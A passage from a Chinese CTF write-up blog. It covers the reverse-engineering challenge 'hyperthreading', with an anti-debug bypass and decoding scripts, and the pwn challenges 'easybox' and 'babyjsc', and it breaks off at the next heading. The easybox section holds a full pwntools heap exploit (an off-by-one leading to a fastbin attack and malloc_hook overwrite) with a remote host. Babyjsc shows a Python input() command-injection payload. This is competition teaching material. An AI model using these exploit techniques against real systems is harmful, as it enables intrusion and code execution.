class="hljs-number">36</span>,<span class="hljs-number">86</span>,<span class="hljs-number">25</span>,<span class="hljs-number">46</span>],            [<span class="hljs-number">39</span>,<span class="hljs-number">78</span>,<span class="hljs-number">52</span>,<span class="hljs-number">9</span>,<span class="hljs-number">62</span>,<span class="hljs-number">37</span>,<span class="hljs-number">84</span>],            [<span class="hljs-number">23</span>,<span class="hljs-number">6</span>,<span class="hljs-number">14</span>,<span class="hljs-number">74</span>,<span class="hljs-number">48</span>,<span class="hljs-number">12</span>,<span class="hljs-number">83</span>],            [<span class="hljs-number">27</span>,<span class="hljs-number">85</span>,<span class="hljs-number">92</span>,<span class="hljs-number">42</span>,<span class="hljs-number">48</span>,<span class="hljs-number">15</span>,<span class="hljs-number">72</span>],            [<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>,<span class="hljs-number">68</span>]])b = np.array([[<span class="hljs-number">20247</span>],[<span class="hljs-number">40182</span>],[<span class="hljs-number">36315</span>],[<span class="hljs-number">36518</span>],[<span class="hljs-number">26921</span>],[<span class="hljs-number">39185</span>],[<span class="hljs-number">16546</span>]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12094</span>],[<span class="hljs-number">25270</span>],[<span class="hljs-number">19330</span>],[<span class="hljs-number">18540</span>],[<span class="hljs-number">16386</span>],[<span class="hljs-number">21207</span>],[<span class="hljs-number">11759</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10460</span>],[<span class="hljs-number">25613</span>],[<span class="hljs-number">21135</span>],[<span class="hljs-number">24891</span>],[<span class="hljs-number">18305</span>],[<span class="hljs-number">27415</span>],[<span class="hljs-number">12855</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10899</span>],[<span class="hljs-number">24927</span>],[<span class="hljs-number">20670</span>],[<span class="hljs-number">22926</span>],[<span class="hljs-number">18006</span>],[<span class="hljs-number">23345</span>],[<span class="hljs-number">12602</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12304</span>],[<span class="hljs-number">26622</span>],[<span class="hljs-number">19807</span>],[<span class="hljs-number">22747</span>],[<span class="hljs-number">14233</span>],[<span class="hljs-number">24736</span>],[<span class="hljs-number">10064</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">14169</span>],[<span class="hljs-number">35155</span>],[<span class="hljs-number">28962</span>],[<span class="hljs-number">33273</span>],[<span class="hljs-number">21796</span>],[<span class="hljs-number">35185</span>],[<span class="hljs-number">14877</span>]])x = np.linalg.solve(a, b)result += x.tolist()flag=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> i:        flag+=chr(int(f+<span class="hljs-number">0.5</span>))print(flag)</code></pre></div><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>主程序很简单，要求输入42位的flag。</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>这里开始开多线程。</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>这里面分别有一个反调试。用的IsDebuggerPresent。<br>￼￼￼￼￼￼￼￼<br>还有对你输入的东西进行处理，处理完以后与</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">402150</span> key             db <span class="hljs-number">0</span>DDh,<span class="hljs-number">5</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">1</span>Dh,<span class="hljs-number">20</span>h,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">91</span>h,<span class="hljs-number">2</span> dup(<span class="hljs-number">90</span>h),<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                                         ; DATA XREF: main1+<span class="hljs-number">96</span>↑r.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">92</span>h,<span class="hljs-number">0</span>DEh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">11</span>h,<span class="hljs-number">0</span>D1h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">51</span>h,<span class="hljs-number">11</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">51</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">2</span> dup(<span class="hljs-number">5</span>Dh),<span class="hljs-number">11</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">90</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">91</span>h,<span class="hljs-number">92</span>h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">9</span>Fh</code></pre></div><p>这42个数据进行对比。</p><p>那么思路就是过了反调试，定位关键处理输入的代码处，进行确定其是怎么操作数据的，但是看了一会没有找到，就开始想办法寻找字符映射来碰撞flag。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>然后进行一位位替换，获得flag：</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><p>主程序很简单，要求输入42位的flag。</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>开始新的线程：</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>这有一个反调试。用的IsDebuggerPresent，过的办法很简单，在x64dbg中在进入IsDebuggerPresent时，输入dbh，隐藏调试器即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>测试在这里dbh即可。<br>￼￼￼￼￼￼￼￼<br>还有对你的input进行处理，处理完以后与<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>这42个数据进行对比。</p><p>先过了反调试，定位关键处理输入的代码处（0x401223），进行确定其是怎么操作数据的，看了一会发现没有如此简单，但是发现你输入特定字符，经过程序处理出来的都是一样的:</p><p>随意输入<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>可以打印字符不算多，这就可以可以建立一个映射表：<br>输入<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>处理完：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>获取映射表：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span></code></pre></div><p>提取一下key：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>然后进行一位位替换，获得flag：</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>可以确定一下ida无法识别的数据段，是被花指令处理过了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>这里开始往下识别异常，在动态调试后，提取一下正确的汇编代码，根据正确的算法进行patch掉花指令。（还是注意dbh隐藏一下调试器。）</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __stdcall __<span class="hljs-function">noreturn <span class="hljs-title">sub_401120</span><span class="hljs-params">(LPVOID lpThreadParameter)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span>  CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, hHandle, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  WaitForSingleObject(hHandle, <span class="hljs-number">0xFFFFFFFF</span>);  inputs[<span class="hljs-number">0</span>] = (inputs[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">6</span>) ^ ((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">unsigned</span> __int8)inputs[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0x23</span>u;  Sleep(<span class="hljs-number">6u</span>);  v1 = *(<span class="hljs-keyword">unsigned</span> __int8 *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] += <span class="hljs-number">0x23</span>;  JUMPOUT(loc_4011EC);&#125;</code></pre></div><p>Patch 后的，勉强可以看懂。其中肯定是<code>inputs[i]</code>进行处理的，其中也有一个地方在加1。</p><div class="hljs"><pre><code class="hljs python">key = [    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,     <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    key[i] -= <span class="hljs-number">0x23</span>    key[i] &amp;= <span class="hljs-number">0xff</span> <span class="hljs-comment">#有可能运算后会小于0的，所以给处理一下</span>    key[i] ^= <span class="hljs-number">0x23</span>    key[i] = ((key[i] &gt;&gt; <span class="hljs-number">6</span>) ^ (key[i] &lt;&lt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xff</span>    flag += chr(key[i])print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>ubuntu 16，off by one，没有show函数，需要攻击stdout泄漏libc地址。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>用off by one，构造出chunk overlapping ,并且想办法释放堆块，让<code>main_arena_</code>落在fastbin中</li><li>修改这个<code>main_arena_</code>的最后2个字节，让其指向<code>stdout</code>附近带有<code>0x7f</code>的地址（属于0x70的fastbin堆块）</li><li>使用chunk overlapping ，来修改空闲的fastbin chain，使其中一个指向这个带有<code>main_arena</code>的堆块，进行fastbin attack，修改到stdout处的内容，leak libc</li><li>重复以上的步骤，构造一个堆块到<code>malloc_hook</code>处，写上one gadget 即可。</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'101.200.53.148'</span>,<span class="hljs-number">34521</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloca</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-comment"># def pwn():</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f0</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">2</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'/bin/sh\x00'</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">'\xc1'</span>)    free(<span class="hljs-number">1</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">'aaaaaa'</span>)    alloca(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">10</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">7</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x38</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + <span class="hljs-string">'\xe1'</span>)    free(<span class="hljs-number">8</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">9</span>)    free(<span class="hljs-number">5</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x20'</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    alloca(<span class="hljs-number">12</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    <span class="hljs-comment"># debug()</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">14</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad3c80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">15</span>,<span class="hljs-number">0x60</span>,payload)<span class="hljs-comment"># leak_addr()</span>leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('101.200.53.148',34521)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)rec = <span class="hljs-number">0xf1207</span> + libc_base<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getshell</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">11</span>)    free(<span class="hljs-number">6</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">13</span>)    free(<span class="hljs-number">12</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x90'</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x90</span>,payload)    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(rec)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,payload)    <span class="hljs-comment"># debug()</span>    sleep(<span class="hljs-number">0.1</span>)    <span class="hljs-comment"># alloca(8,30,'1')</span>getshell()itr()</code></pre></div><p>深夜写的exp，估计构造堆块的思路有点混乱。🤣🤣</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>比赛时没有做出来，开始以为是个webpwn，不敢去做。但是很多队伍做出来了，试着去做，看到server.py,不了解jsc，以为只能执行js代码，废了很大精力写js来读取flag，还是没有成功。tcl。</p><p>最后看wp，知道了input函数本身就是个漏洞函数，其会将stdin输入的内容当做python代码去执行（就像执行计算式一样，将其看做python代码，通过计算返回结果）。当然可以用它来执行命令，不过需要先倒入os的模块，然后执行系统命令。</p><div class="hljs"><pre><code class="hljs python">__import__(<span class="hljs-string">'os'</span>).system(<span class="hljs-string">'cat /home/ctf/flag'</span>)</code></pre></div><p>对于python，input函数漏洞，参考链接：<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs python">*] <span 